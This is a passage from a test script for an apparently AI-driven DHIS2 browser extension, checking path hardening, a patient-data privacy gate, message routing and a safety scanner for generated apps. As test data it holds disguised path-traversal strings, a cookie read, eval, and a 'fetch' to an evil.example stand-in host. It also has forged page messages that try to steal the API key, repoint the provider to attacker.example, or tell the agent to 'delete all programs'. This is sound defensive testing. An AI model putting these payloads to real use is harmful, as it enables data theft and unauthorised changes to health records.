  truthy('insecure context (no mediaDevices) → SCREENSHOT_FAILED InsecureContextError', p.msgs.some((m) => m.type === 'SCREENSHOT_FAILED' && m.reason === 'InsecureContextError'));
  screenshotChecksDone = true;
})().catch((e) => { screenshotChecksDone = true; bad(`screenshot checks threw: ${e && e.stack || e}`); });

// ── Security & navigation hardening (core.js / providers.js / agent.js) ─────
// Microtask-only, like the blocks above; the verdict checks it finished.
let hardeningChecksDone = false;
if (loaded) (async () => {
  console.log('\nSecurity & navigation hardening:');
  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
  const flush = async () => { for (let i = 0; i < 50; i++) await Promise.resolve(); };

  // Disguised paths: fetch() resolves these into a different endpoint than the
  // string every gate inspected (live on 2.42: 7 forms read patient rows).
  const amb = ctx.ambiguousApiPathReason;
  const disguised = ['programs/../tracker/trackedEntities', './tracker/events', 'programs/%2e%2e/tracker/events',
    'programs/.%2E/tracker/events', 'tracker/%74rackedEntities', 'tracker\\trackedEntities', 'tracker/events#', 'tracker;x=1/events'];
  truthy('every disguised path form is refused', disguised.every((p) => amb(p)));
  const plain = ['programs/a3kGcGpz8FJ?fields=id,programStages[id,name]', 'tracker/events.json?program=a3kGcGpz8FJ',
    'dataStore/dhis2-ai-backups/key%20with%20space', 'analytics?dimension=dx:a3kGcGpz8FJ;b3kGcGpz8FJ&filter=pe:LAST_12_MONTHS',
    'programIndicators/expression/description?expression=%23%7Bx%7D', 'metadata?importMode=VALIDATE'];
  truthy('plain API paths (incl. ; and # in the QUERY, %20 in a key) are untouched', plain.every((p) => !amb(p)));
  const d = ctx.__dhis2();
  const saved = { baseUrl: d.baseUrl, apiVersion: d.apiVersion };
  d.baseUrl = 'http://localhost:8081'; d.apiVersion = '42';
  const r1 = await ctx.__realSafeDhis2Fetch('programs/../tracker/trackedEntities?program=a3kGcGpz8FJ');
  truthy('safeDhis2Fetch refuses a disguised path before any request', r1 && r1._refused_path === true);
  let threw = false;
  try { ctx.apiUrl('trackedEntityTypes/%2e%2e/tracker/enrollments'); } catch { threw = true; }
  truthy('apiUrl refuses a disguised path', threw);
  Object.assign(d, saved);

  // Privacy gate on its own: canonical path + boundary.
  const prd = ctx.pathReadsPatientData;
  truthy('gate sees through ../, ./, %2e, %74, backslash and #',
    ['programs/../tracker/trackedEntities', './tracker/events', 'x/%2e%2e/tracker/enrollments', 'tracker/%74rackedEntities',
     'tracker\\events', 'tracker/events#', 'programs/x/../../tracker/relationships?x=1', '/api/42/tracker/events.csv'].every(prd));
  truthy('gate does not over-block metadata / aggregate paths',
    !['programs/../dataElements', 'eventReports', 'eventVisualizations?fields=id', 'analytics/events/aggregate/a3kGcGpz8FJ', 'trackedEntityTypes', 'trackedEntityInstanceFilters'].some(prd));

  // "Local" for privacy = where the requests go, not the preset name.
  const stay = ctx.providerRequestsStayLocal, base = ctx.DEFAULT_PROVIDER_CONFIG || {};
  truthy('default local Ollama stays local', stay({ providerType: 'ollama', apiBaseUrl: 'http://localhost:11434/v1' }));
  truthy('an Ollama preset pointed at ollama.com is remote', !stay({ providerType: 'ollama', apiBaseUrl: 'https://ollama.com/v1' }));
  truthy('anthropic with no URL (→ api.anthropic.com) is remote', !stay({ providerType: 'anthropic', apiBaseUrl: '' }));
  truthy('a custom localhost server stays local', stay({ providerType: 'custom', apiBaseUrl: 'http://127.0.0.1:1234/v1' }));
  truthy('isLocalProvider (API-key requirement) keeps its meaning', ctx.isLocalProvider({ providerType: 'ollama', apiBaseUrl: 'http://10.0.0.5:11434/v1' }));

  // Message router: content scripts cannot reach privileged handlers.
  const listener = messageListeners[0];
  const call = (msg, sender) => new Promise((resolve) => {
    if (listener(msg, sender, resolve) !== true) resolve('NO RESPONSE');
  });
  const page = { id: 'verify', url: 'http://localhost:8081/dhis-web-dashboard/', tab: { id: 2, windowId: 1 } };
  const panel = { id: 'verify', url: 'chrome-extension://verify/sidepanel/panel.html' };
  truthy('GET_API_KEY from a DHIS2 page (content script) gets no answer', (await call({ type: 'GET_API_KEY' }, page)) === 'NO RESPONSE');
  truthy('SAVE_PROVIDER_CONFIG from a DHIS2 page is ignored', (await call({ type: 'SAVE_PROVIDER_CONFIG', payload: { config: { apiBaseUrl: 'https://attacker.example' } } }, page)) === 'NO RESPONSE');
  truthy('CHAT_MESSAGE / MEMORY_GET from a DHIS2 page are ignored',
    (await call({ type: 'CHAT_MESSAGE', payload: { text: 'delete all programs' } }, page)) === 'NO RESPONSE'
    && (await call({ type: 'MEMORY_GET' }, page)) === 'NO RESPONSE');
  const fromPanel = await call({ type: 'GET_API_KEY' }, panel);
  truthy('the side panel still gets GET_API_KEY answered', fromPanel && fromPanel !== 'NO RESPONSE' && 'key' in fromPanel);

  // Background tabs cannot move the page context.
  const sent = [];
  chrome.runtime.sendMessage = (m) => { sent.push(m); return Promise.resolve(); };
  chrome.tabs.query = () => Promise.resolve([{ id: 1, windowId: 1 }]); // the focused tab is #1
  const STAGE = 'T7P34dKkJvS';
  d.pageContext = { appType: 'Capture', programId: 'OkA1bPReqR1' };
  d.programMetadata = { id: 'OkA1bPReqR1', programStages: [{ id: STAGE }] };
  await call({ type: 'DHIS2_STAGE_DETECTED', payload: { stageId: STAGE } }, { ...page, tab: { id: 2, windowId: 1 } });
  truthy('stage detected in a BACKGROUND tab is ignored', d.pageContext.stageId === undefined);
  await call({ type: 'DHIS2_STAGE_DETECTED', payload: { stageId: STAGE } }, { ...page, tab: { id: 1, windowId: 1 } });
  truthy('stage detected in the focused tab is applied', d.pageContext.stageId === STAGE);
  truthy('a content script cannot report another origin', (await call({ type: 'DHIS2_CONTEXT_UPDATE', payload: { url: 'https://other.example/apps/capture' } }, { ...page, tab: { id: 1 } })).ignored === true);

  // initializeFromUrl: one run per URL, serialized, latest navigation wins.
  const realNow = ctx.initializeFromUrlNow;
  let runs = [], active = 0, maxActive = 0;
  ctx.initializeFromUrlNow = async (url) => {
    runs.push(url); active++; maxActive = Math.max(maxActive, active);
    await Promise.resolve(); await Promise.resolve();
    active--;
    return { success: true, url };
  };
  const A = 'http://localhost:8081/apps/capture#/?programId=a3kGcGpz8FJ', B = 'http://localhost:8081/apps/capture#/?programId=b3kGcGpz8FJ';
  const same = await Promise.all([ctx.initializeFromUrl(A), ctx.initializeFromUrl(A), ctx.initializeFromUrl(A)]);
  truthy('3 concurrent calls for one URL → ONE context load', runs.length === 1 && same.every((r) => r.url === A));
  runs = [];
  const [ra, rb] = await Promise.all([ctx.initializeFromUrl(A), ctx.initializeFromUrl(B)]);
  truthy('A then B at once → only B loads; A\'s caller gets B\'s result', runs.length === 1 && runs[0] === B && ra.url === B && rb.url === B);
  truthy('context loads never overlap', maxActive === 1);
  ctx.initializeFromUrlNow = realNow;
  delete chrome.runtime.sendMessage;
  chrome.tabs.query = () => Promise.resolve([]);
  await flush();
  hardeningChecksDone = true;
})().catch((e) => { hardeningChecksDone = true; bad(`hardening checks threw: ${e && e.stack || e}`); });

// ── manage_custom_app (src/tools-apps.js) ───────────────────────────────────
// Runs from the verdict's setImmediate, AFTER every other async block has
// drained, because it swaps the shared fetch / safeDhis2Fetch stubs. Still
// microtask-only: the kit is served from disk through a resolved-promise fetch
// stub, Sucrase and fflate are synchronous.
async function runCustomAppChecks() {
  console.log('\nCustom apps & plugins (manage_custom_app):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(`${label} => ${JSON.stringify(got)}`) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  const d = ctx.__dhis2();
  const saved = { baseUrl: d.baseUrl, apiVersion: d.apiVersion, writeAuth: d.writeAuth, fetch: ctx.fetch, sdf: ctx.safeDhis2Fetch };
  d.baseUrl = 'http://localhost:8081'; d.apiVersion = 42;

  // Keys: slugified from the name, always ai-, [a-z0-9-], ≤ 40 chars.
  eq('slug("ANC coverage widget")', ctx.slugifyCustomAppKey('ANC coverage widget'), 'ai-anc-coverage-widget');
  eq('slug("AI Demo") keeps a single ai- prefix', ctx.slugifyCustomAppKey('AI Demo'), 'ai-demo');
  truthy('slug of an Arabic-only name is a stable ai-app-<hash>', /^ai-app-[a-z0-9]+$/.test(ctx.slugifyCustomAppKey('ملخص الوحدات')) && ctx.slugifyCustomAppKey('ملخص الوحدات') === ctx.slugifyCustomAppKey('ملخص الوحدات'));
  truthy('slug of a very long name is ≤ 40 chars and has no trailing hyphen', (() => { const k = ctx.slugifyCustomAppKey('A very long name for a dashboard widget that shows many things'); return k.length <= 40 && !k.endsWith('-'); })());
  truthy('explicit key without ai- prefix is refused', !!ctx.resolveCustomAppKey({ key: 'demo' })._error);
  truthy('explicit key with upper case / underscore is refused', !!ctx.resolveCustomAppKey({ key: 'ai-Bad_Key' })._error);
  eq('valid explicit key is kept', ctx.resolveCustomAppKey({ key: 'ai-kpi-2' }).key, 'ai-kpi-2');
  eq('version bump patch / minor', [ctx.bumpCustomAppVersion('1.0.0'), ctx.bumpCustomAppVersion('1.2.3', 'minor')], ['1.0.1', '1.3.0']);
  const bk = ctx.customAppBackupKey('ai-kpi-2');
  eq('backup key round-trips the app key (hyphenated keys)', ctx.parseCustomAppBackupKey(bk) && ctx.parseCustomAppBackupKey(bk).appKey, 'ai-kpi-2');
  eq('a metadata backup key is not an app backup', ctx.parseCustomAppBackupKey('backup-20260708T111347Z-update-uY6mWX'), null);

  // Compile: Sucrase errors carry line / column + a code frame.
  const brokenJsx = 'const A = () => (\n  <div>\n    <span>x</div>\n);';
  const ce = ctx.compileCustomAppFile('app.jsx', brokenJsx);
  truthy('JSX syntax error → line/column + frame', ce.error && ce.error.line === 3 && ce.error.column > 0 && /3 \|/.test(ce.error.frame));
  const crossed = ctx.compileCustomAppFile('app.jsx', 'const A = () => <h1 className="t">Title</h2>;');
  truthy('crossed tags (<h1>…</h2>) are an error — Sucrase alone would compile them silently', crossed.error && /<\/h2> found where <\/h1> was expected/.test(crossed.error.message));
  const missingParen = ctx.compileCustomAppFile('app.jsx', 'const A = () => (\n  <div>\n    {a.map(x => <b>{x}</b>}\n  </div>\n);');
  truthy('a missing ")" before "}" is reported on its own line (not where Sucrase backtracked)', missingParen.error && missingParen.error.line === 3 && /"\)" was expected/.test(missingParen.error.message));
  truthy('valid JSX compiles to React.createElement', /React\.createElement\(/.test(ctx.compileCustomAppFile('app.jsx', 'const A = () => <b>x</b>;').code || ''));

  // Safety scan.
  const scan = (src, opts) => ctx.scanCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, { allowedOrigin: 'http://localhost:8081', ...(opts || {}) });
  const banned = {
    eval: 'eval("1+1");',
    'new-function': 'const f = new Function("return 1");',
    cookie: 'const c = document.cookie;',
    'browser-storage': 'localStorage.setItem("a", "b");',
    'script-tag': 'const s = "<script src=x></script>";',
    'external-request': 'fetch("https://evil.example.com/steal");',
    import: 'import x from "y";',
    require: 'const x = require("y");',
    'html-injection': 'const A = () => <div dangerouslySetInnerHTML={{ __html: "x" }} />;',
    socket: 'new WebSocket("wss://x");',
  };
  for (const [rule, src] of Object.entries(banned)) {
    truthy(`safety scan catches ${rule}`, scan(src).some((v) => v.rule === rule));
  }
  truthy('UI text that merely mentions localStorage / eval() is not flagged', scan('const A = () => <p>Nothing is kept in localStorage or passed to eval()</p>;').length === 0);
  truthy('same-origin absolute fetch is allowed', scan('fetch("http://localhost:8081/api/42/me");').length === 0);
  const writeSrc = 'const { useDataMutation } = D2Runtime;\nconst M = { resource: "dataStore/ai-x/k", type: "create", data: {} };\nfunction A() { const [m] = useDataMutation(M); return null; }';
  truthy('mutation refused when needs_write_access is false', scan(writeSrc).some((v) => v.rule.startsWith('write:')));
  eq('mutation allowed when needs_write_access is true', scan(writeSrc, { needsWriteAccess: true }).length, 0);
  truthy('fetch with method POST refused when read-only', scan('fetch("/api/42/dataStore/x/y", { method: "POST" });').some((v) => v.rule === 'write:http-write'));

  // Lint: the runtime errors a blank page would otherwise hide.
  const kitMeta = JSON.parse(fs.readFileSync(path.join(ROOT, 'libs/d2-kit/KIT_VERSION.json'), 'utf8'));
  const lint = (src, kind = 'app') => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, kind, kitMeta);
  const root = "\nReactDOMClient.createRoot(document.getElementById('root')).render(<A />);";
  truthy('undeclared <Card> is an error naming the D2UI fix', lint('const A = () => <Card>x</Card>;' + root).errors.some((e) => /Card/.test(e.message) && /D2UI/.test(e.message)));
  truthy('a name D2UI does not export is an error', lint('const { Grid } = D2UI;\nconst A = () => <Grid />;' + root).errors.some((e) => /no export "Grid"/.test(e.message)));
  truthy('bare useState() without destructuring is an error', lint('const A = () => { const [a] = useState(0); return a; };' + root).errors.some((e) => /useState/.test(e.message)));
  truthy('inline useDataQuery({…}) is an error (static-input trap)', lint('const { useDataQuery, DataProvider } = D2Runtime;\nconst A = () => { useDataQuery({ a: { resource: "me" } }); return null; };' + root).errors.some((e) => /inline object/.test(e.message)));
  truthy('HeaderBar is refused (Global Shell draws it)', lint('const { HeaderBar } = D2UI;\nconst A = () => <HeaderBar />;' + root).errors.some((e) => /HeaderBar/.test(e.message)));
  {
    // A program explorer's search and paging did nothing (deepseek, 2026-11-08).
    const once = (src) => lint("const { useState, useEffect } = React;\nconst { useDataQuery } = D2Runtime;\nconst Q = { list: { resource: 'programs', params: ({ page, q }) => ({ page, filter: 'displayName:ilike:' + q }) } };\n" + src + root).errors.some((e) => /fetches only once/.test(e.message));
    truthy('useDataQuery with variables from this component\'s useState and no refetch is an error (search and paging would do nothing)',
      once("function A() { const [q, setQ] = useState(''); const [page, setPage] = useState(1); const { data } = useDataQuery(Q, { variables: { page, q } }); return null; }"));
    truthy('…a refetch on those values is fine', !once("function A() { const [q, setQ] = useState(''); const [page, setPage] = useState(1); const { data, refetch } = useDataQuery(Q, { variables: { page, q } }); useEffect(() => { refetch({ page, q }); }, [page, q]); return null; }"));
    // NCD worklist (deepseek, 2026-11-08): data.pager / data['events'] on a useDataQuery
    // result → an empty first page, 0 patients shown, every request answering 200.
    {
      // Scorecard plugin (2026-11-10): two queries on one resource, different params
      // functions, same variables → app-runtime served the second the first one's data.
      const js = ctx.buildCustomAppConfigJs({ key: 'ai-x', name: 'x', version: '1.0.0', kind: 'app', apiVersion: 42, kitVersion: '1.0.0' });
      const calls = [];
      const win = { D2Runtime: { useDataQuery: (q, o) => { calls.push([q, o]); return {}; }, useDataEngine: 1 } };
      new Function('window', 'location', js)(win, { pathname: '/api/apps/ai-x/index.html', origin: 'http://h' });
      const QA = { q: { resource: 'analytics/events/aggregate/p', params: ({ ou }) => ({ stage: 'A', ou }) } };
      const QB = { q: { resource: 'analytics/events/aggregate/p', params: ({ ou }) => ({ stage: 'B', ou }) } };
      const QS = { me: { resource: 'me', params: { fields: 'id' } } };
      win.D2Runtime.useDataQuery(QA, { variables: { ou: 'O' } });
      win.D2Runtime.useDataQuery(QB, { variables: { ou: 'O' } });
      win.D2Runtime.useDataQuery(QA, { variables: { ou: 'O' } });
      win.D2Runtime.useDataQuery(QS);
      truthy('generated apps give each query that holds a function its own cache key (app-runtime hashes the key without functions)',
        calls[0][1].variables.__query !== calls[1][1].variables.__query && calls[0][1].variables.__query === calls[2][1].variables.__query && calls[0][0] === calls[2][0]);
      truthy('…the app\'s params function never sees the extra variable, a static query is passed through untouched, other exports stay',
        JSON.stringify(calls[1][0].q.params(calls[1][1].variables)) === '{"stage":"B","ou":"O"}' && calls[3][0] === QS && calls[3][1] === undefined && win.D2Runtime.useDataEngine === 1);
    }
    // Scorecard plugin (2026-11-10): "Biopsies 10" where 7 were done — event analytics counts scheduled visits.
    const stLint = (params) => lint("const { useDataQuery } = D2Runtime;\nconst Q = { a: { resource: 'analytics/events/aggregate/abcdefghijk', params: " + params + " } };\nfunction A() { const { data } = useDataQuery(Q); const col = (r, n) => r.headers.findIndex((h) => h.name === n); return null; }" + root).errors.some((e) => /only SCHEDULED are counted/.test(e.message));
    truthy('event analytics read with no eventStatus is an error (scheduled visits would be counted); with one it passes',
      stLint("{ dimension: ['ou:USER_ORGUNIT'], filter: ['pe:LAST_12_MONTHS'], stage: 'abcdefghij2' }")
      && !stLint("{ dimension: ['ou:USER_ORGUNIT'], filter: ['pe:LAST_12_MONTHS'], stage: 'abcdefghij2', eventStatus: 'ACTIVE,COMPLETED' }"));
    {
      // Scorecard plugin (2026-11-10): "last 12 months" computed as ending with the current month.
      const pr = ctx.d2PeriodRange;
      const at = new Date(2026, 10, 10, 15, 0, 0); // 10 Nov 2026 — the periods DHIS2 2.42.5 and 2.43.2 returned that day
      const is = (pe, start, end) => { const r = pr(pe, at); return !!r && r.start === start && r.end === end; };
      truthy('D2Periods.range gives DHIS2\'s own windows for relative periods (verified against the server\'s period lists)',
        is('LAST_12_MONTHS', '2025-11-01', '2026-10-31') && is('LAST_3_MONTHS', '2026-08-01', '2026-10-31') && is('THIS_MONTH', '2026-11-01', '2026-11-30') && is('LAST_MONTH', '2026-10-01', '2026-10-31')
        && is('THIS_QUARTER', '2026-10-01', '2026-12-31') && is('LAST_4_QUARTERS', '2025-10-01', '2026-09-30') && is('THIS_YEAR', '2026-01-01', '2026-12-31') && is('LAST_5_YEARS', '2021-01-01', '2025-12-31')
        && is('LAST_SIX_MONTH', '2026-01-01', '2026-06-30') && is('LAST_2_SIXMONTHS', '2025-07-01', '2026-06-30') && is('THIS_BIMONTH', '2026-11-01', '2026-12-31') && is('MONTHS_THIS_YEAR', '2026-01-01', '2026-12-31')
        && is('THIS_WEEK', '2026-11-09', '2026-11-15') && is('LAST_52_WEEKS', '2025-11-10', '2026-11-08') && is('LAST_7_DAYS', '2026-11-03', '2026-11-09') && is('TODAY', '2026-11-10', '2026-11-10'));
      truthy('…ISO ids, several periods joined by ";", and null for what it does not know',
        is('202602', '2026-02-01', '2026-02-28') && is('2024Q1', '2024-01-01', '2024-03-31') && is('2026S2', '2026-07-01', '2026-12-31') && is('2026W45', '2026-11-02', '2026-11-08') && is('2021W1', '2021-01-04', '2021-01-10')
        && is('202605B', '2026-09-01', '2026-10-31') && is('2025April', '2025-04-01', '2026-03-31') && is('20261110', '2026-11-10', '2026-11-10') && is('202601;202603;LAST_YEAR', '2025-01-01', '2026-03-31')
        && pr('THIS_FINANCIAL_YEAR', at) === null && pr('LAST_6_BIMONTHS', at) === null && pr('202601;NONSENSE', at) === null && pr('', at) === null);
      const cfgJs = ctx.buildCustomAppConfigJs({ key: 'ai-x', name: 'x', version: '1.0.0', kind: 'app', apiVersion: 42, kitVersion: '1.0.0' });
      const w2 = {};
      new Function('window', 'location', cfgJs)(w2, { pathname: '/api/apps/ai-x/index.html', origin: 'http://h' });
      truthy('every generated app carries it as D2Periods.range', w2.D2Periods && typeof w2.D2Periods.range === 'function' && w2.D2Periods.range('2026').start === '2026-01-01');
      const handLint = (src) => lint(src + "\nfunction A() { return null; }" + root).errors.some((e) => /by hand/.test(e.message));
      truthy('relative periods worked out by hand are an error naming D2Periods.range; using it, or only comparing a keyword, is fine',
        handLint("function r(p) { const now = new Date(); const M = now.getMonth(); if (p === 'LAST_12_MONTHS') return [new Date(now.getFullYear(), M - 11, 1), now]; return null; }")
        && !handLint("function r(p) { const x = D2Periods.range(p); return x; }\nconst label = (p) => (p === 'LAST_12_MONTHS' ? 'Last 12 months' : p);")
        && !handLint("const label = (p) => (p === 'THIS_YEAR' ? 'This year' : p);")
        && !handLint("const label = (p) => (p === 'THIS_YEAR' ? 'This year (' + new Date().getFullYear() + ')' : p);"));
    }
    // Reporting Completeness Explorer thread (2026-11-10): dx:REPORTING_RATE with a ds filter.
    const rrLint = (src) => lint("const { useDataQuery } = D2Runtime;\n" + src + "\nfunction A() { const { data } = useDataQuery(Q, { variables: { ds: 'BfMAe6Itzgt', pe: '202510' } }); return null; }" + root).errors.some((e) => /reporting-rate metric without its data set/.test(e.message));
    truthy('a bare dx:REPORTING_RATE or a ds: dimension in app code is an error that gives the right form',
      rrLint("const Q = { a: { resource: 'analytics', params: ({ ds, pe }) => ({ dimension: ['dx:REPORTING_RATE;REPORTING_RATE_ON_TIME', 'ou:USER_ORGUNIT;LEVEL-2'], filter: [`pe:${pe}`, `ds:${ds}`] }) } };")
      && rrLint("const Q = { a: { resource: 'analytics', params: ({ ds, pe }) => ({ dimension: [`dx:${ds}.REPORTING_RATE`, 'ou:USER_ORGUNIT'], filter: [`pe:${pe}`, `ds:${ds}`] }) } };")
      && !rrLint("const M = ['REPORTING_RATE', 'REPORTING_RATE_ON_TIME', 'ACTUAL_REPORTS', 'EXPECTED_REPORTS'];\nconst Q = { a: { resource: 'analytics', params: ({ ds, pe }) => ({ dimension: [`dx:${M.map((m) => `${ds}.${m}`).join(';')}`, 'ou:USER_ORGUNIT;LEVEL-2'], filter: [`pe:${pe}`] }) } };"));
    // Breast pathway monitor (deepseek, 2026-11-10): scheduled biopsies counted as
    // biopsies — 11 rows where 8 women had one, "NaN" cells, a wrong median.
    const schedLint = (src) => lint("const { useDataQuery } = D2Runtime;\n" + src + "\nfunction A() { const { data } = useDataQuery(Q); return null; }" + root).errors.some((e) => /only scheduled/.test(e.message));
    const EVQ = "const Q = { ev: { resource: 'tracker/events', params: { program: 'p', orgUnitMode: 'ACCESSIBLE', fields: 'event,occurredAt,status', totalPages: true } } };\n";
    truthy('tracker events read with occurredAt and no scheduled-visit handling is an error',
      schedLint(EVQ + "const first = (evs) => String(evs[0].occurredAt).slice(0, 10);")
      && schedLint(EVQ + "const fixture = { status: 'COMPLETED', occurredAt: '2026-01-01T00:00:00.000' };\nconst done = (evs) => evs.some((e) => e.status === 'COMPLETED' && String(e.occurredAt).slice(0, 10) > '2026');"));
    truthy('…fine when scheduled visits are dropped, a missing date is handled, or the query asks for a status',
      !schedLint(EVQ + "const done = (evs) => evs.filter((e) => e.occurredAt && e.status !== 'SCHEDULE');")
      && !schedLint(EVQ + "const day = (e) => (e.occurredAt ? String(e.occurredAt).slice(0, 10) : null);")
      && !schedLint("const Q = { ev: { resource: 'tracker/events', params: { program: 'p', status: 'COMPLETED', fields: 'event,occurredAt', totalPages: true } } };\nconst first = (evs) => String(evs[0].occurredAt).slice(0, 10);")
      && !schedLint("const Q = { p: { resource: 'programs', params: { fields: 'id,displayName' } } };"));
    const pagerLint = (src) => lint(src + root).errors.some((e) => /\.pager is undefined/.test(e.message));
    truthy('data.pager read on a useDataQuery / engine.query result is an error (the answer sits under the query key)',
      pagerLint("const { useDataQuery } = D2Runtime;\nconst Q = { ev: { resource: 'tracker/events', params: { pageSize: 100, totalPages: true } } };\nfunction A() { const { data, refetch } = useDataQuery(Q); const pc = (data && data.pager && data.pager.pageCount) || 1; return null; }")
      && pagerLint("const { useDataEngine } = D2Runtime;\nconst Q = { ev: { resource: 'tracker/events' } };\nfunction A() { const engine = useDataEngine(); const load = async () => { const res = await engine.query(Q); return res?.pager; }; return null; }")
      && !pagerLint("const { useDataQuery } = D2Runtime;\nconst Q = { ev: { resource: 'tracker/events' } };\nfunction A() { const { data } = useDataQuery(Q); const pc = data && data.ev.pager.pageCount; return null; }"));
    {
      // ANC plugin thread, play 2.43.2 (2026-11-08): list queries answered nothing for
      // objects that exist, so a real indicator was "invented" and an untouched
      // dashboard could not be saved over its two map tiles.
      const dd = ctx.__dhis2(), savedSdf = ctx.safeDhis2Fetch, savedBase = dd.baseUrl;
      dd.baseUrl = 'https://broken.invalid';
      vm.runInContext('_listQueryHealth.clear();', ctx);
      ctx.safeDhis2Fetch = async (p) => {
        if (p.startsWith('metadata?')) return {};
        if (p.startsWith('me?')) return { organisationUnits: [{ id: 'ouRoot00001' }] };
        if (p.startsWith('organisationUnits?filter=id:eq:ouRoot00001')) return { organisationUnits: [] };
        if (p.startsWith('identifiableObjects/indRealAAAA')) return { id: 'indRealAAAA', href: 'https://broken.invalid/api/indicators/indRealAAAA' };
        if (p.startsWith('maps/mapRealAAAA')) return { id: 'mapRealAAAA', displayName: 'ANC map' };
        if (p.startsWith('maps/mapGoneAAAA')) return { _error: 'not found', _status: 404 };
        return { _error: 'Not found', _status: 404 };
      };
      try {
        const u = await ctx.checkCustomAppUids(['indRealAAAA', 'madeUpAAAAA']);
        truthy('on a server whose list queries miss existing objects, an id is confirmed by a direct read before it is called invented (a made-up one still is)',
          u.found.indRealAAAA === 'indicators' && u.unknown.length === 1 && u.unknown[0] === 'madeUpAAAAA' && /ouRoot00001/.test(u.list_queries_broken || ''));
        const err = (ids) => ({ success: false, errors: ids.map(([m, t]) => `Invalid reference [${m}] (Map) on object [${t}] (DashboardItem) for association \`map\``) });
        const d1 = await ctx.diagnoseDashboardSaveRefusal(err([['mapRealAAAA', 'tileOld0001']]), [{ id: 'tileOld0001' }]);
        const d2 = await ctx.diagnoseDashboardSaveRefusal(err([['mapGoneAAAA', 'tileOld0002']]), [{ id: 'tileOld0002' }]);
        const d3 = await ctx.diagnoseDashboardSaveRefusal(err([['mapRealAAAA', 'tileNew0001']]), [{ id: 'tileOld0001' }]);
        truthy('a dashboard save refused over tiles already on it is diagnosed once: existing objects the server cannot find (stop probing, offer the choices), or tiles pointing at deleted objects; a refusal about the new item gets no such note',
          d1._scope === 'dashboard_existing_tiles_unresolvable' && /ANC map/.test(d1._diagnosis) && /list queries return nothing/.test(d1._diagnosis) && /Do not probe further/.test(d1._hint)
          && d2._scope === 'dashboard_existing_tiles_missing' && /no longer exists/.test(d2._diagnosis) && !d3._scope);
      } finally { ctx.safeDhis2Fetch = savedSdf; dd.baseUrl = savedBase; vm.runInContext('_listQueryHealth.clear();', ctx); }
    }
    {
      // Child vaccination app + immunization dashboard, play 2.43.2.1 (2026-11-25): org-unit
      // lists were fine but EVERY dataElements list answered nothing. Seven real data
      // elements were called invented, and line lists with a data-element column saved
      // unreadable ("Not a valid dimension") while the tool said success.
      const dd = ctx.__dhis2(), savedSdf = ctx.safeDhis2Fetch, savedBase = dd.baseUrl;
      dd.baseUrl = 'https://de-broken.invalid';
      vm.runInContext('_listQueryHealth.clear();', ctx);
      const deleted = [];
      ctx.safeDhis2Fetch = async (p, o = {}) => {
        if (o.method === 'DELETE') { deleted.push(p); return {}; }
        if (p.startsWith('metadata?')) return {};
        if (p.startsWith('me?')) return { organisationUnits: [{ id: 'ouRoot00002' }] };
        if (p.startsWith('organisationUnits?filter=id:eq:ouRoot00002')) return { organisationUnits: [{ id: 'ouRoot00002' }] };
        if (p.startsWith('programStages?fields=programStageDataElements')) return { programStages: [{ programStageDataElements: [{ dataElement: { id: 'deReal00001' } }] }] };
        if (p.startsWith('dataElements?filter=id:eq:deReal00001')) return { dataElements: [] };
        if (p.startsWith('categoryCombos?')) return { categoryCombos: [{ categoryOptionCombos: [{ id: 'cocReal0001' }] }] };
        if (p.startsWith('categoryOptionCombos?filter=id:eq:cocReal0001')) return { categoryOptionCombos: [{ id: 'cocReal0001' }] };
        if (p.startsWith('identifiableObjects/deReal00001')) return { id: 'deReal00001', href: 'https://de-broken.invalid/api/dataElements/deReal00001' };
        if (p.startsWith('dataElements/deReal00001')) return { id: 'deReal00001', displayName: 'MCH Weight (g)' };
        return { _error: 'Not found', _status: 404 };
      };
      try {
        const h = await ctx.serverListQueriesBroken();
        truthy('the list-query probe is per type: data-element lists answering nothing are found even when org-unit and option-combo lists work',
          h.broken === true && h.types.length === 1 && h.types[0] === 'dataElements' && /deReal00001/.test(h.probe));
        const u = await ctx.checkCustomAppUids(['deReal00001', 'madeUpCCCCC']);
        truthy('…so a real data element in app code is confirmed by a direct read, not called invented (a made-up id still is)',
          u.found.deReal00001 === 'dataElements' && u.unknown.length === 1 && u.unknown[0] === 'madeUpCCCCC');
        const diag = await ctx.lineListUnreadableDiagnosis('llBroken001', 'DHIS2 API 400: Not a valid dimension: progAAAAAAA.stageAAAAAA.deReal00001');
        truthy('a saved line list DHIS2 cannot read back is deleted and reported as not built, with the server fault named',
          deleted.includes('eventVisualizations/llBroken001') && /cannot read it back/.test(diag._error) && /deleted again/.test(diag._error)
          && /Server problem/.test(diag._diagnosis || '') && /MCH Weight/.test(diag._diagnosis) && /not built/.test(diag._hint) && !diag.success);
        deleted.length = 0;
        const kept = await ctx.lineListUnreadableDiagnosis('llBroken002', 'DHIS2 API 400: Not a valid dimension: x', { keep: true });
        truthy('…an updated list is not deleted (the backup restores it)', !deleted.length && /still saved/.test(kept._error));
      } finally { ctx.safeDhis2Fetch = savedSdf; dd.baseUrl = savedBase; vm.runInContext('_listQueryHealth.clear();', ctx); }
    }
    {
      // "Registered more than 10 weeks ago": a date condition on a line list's time column
      // was silently dropped and the list showed everyone (2026-11-25).
      const rng = ctx.lineListDateFilterToRange;
      truthy('a date condition on a time column becomes a date range (LT moves the end back a day; GE+LE both bounds; string form too); periods plus a one-sided date are refused with the range shape',
        rng({ operator: 'LT', value: '2026-09-16' }, []).range === '1900-01-01_2026-09-15'
        && rng({ conditions: [{ operator: 'GE', value: '2026-01-01' }, { operator: 'LE', value: '2026-03-31' }] }, ['THIS_YEAR']).range === '2026-01-01_2026-03-31'
        && rng('GT:2026-01-31:LT:2026-03-01', []).range === '2026-02-01_2026-02-28'
        && /ONE date range/.test(rng({ operator: 'LT', value: '2026-09-16' }, ['THIS_YEAR', 'LAST_5_YEARS'])._error || '')
        && /ISO date/.test(rng({ operator: 'LT', value: 'ten weeks ago' }, [])._error || '')
        && rng(null, ['THIS_YEAR']).range === null);
      const probe = ctx.lineListBuildProbePath('ENROLLMENT', 'progAAAAAAA', null, [], [
        { kind: 'ou', dimension: 'ou', items: ['ouRoot00001'] },
        { kind: 'time', dimension: 'enrollmentDate', items: ['1900-01-01_2026-09-15'] }]);
